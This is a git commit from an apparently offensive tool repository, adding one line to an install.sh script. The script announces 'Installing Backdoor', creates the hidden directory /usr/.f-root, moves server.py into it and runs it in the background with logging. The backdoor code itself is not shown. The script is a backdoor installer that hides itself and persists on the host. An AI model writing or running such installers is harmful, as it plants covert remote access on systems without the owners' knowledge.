d5c8853e74edc443c43346502517a8c3bd98d633
Detrew <82747830+Detrew@users.noreply.github.com>
2023-04-16 04:43:50 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -3,6 +3,7 @@ clear
 echo "[+] Installing Backdoor..."
 mkdir /usr/.f-root
 mv server.py /usr/.f-root/
+mv kick_message /usr/.f-root
 cd /usr/.f-root/
 python3 /usr/.f-root/server.py >/usr/.f-root/backdoor.log 2>/usr/.f-root/backdoor.log &
 echo "[+] Backdoor Installed... on (/usr/.f-root)"
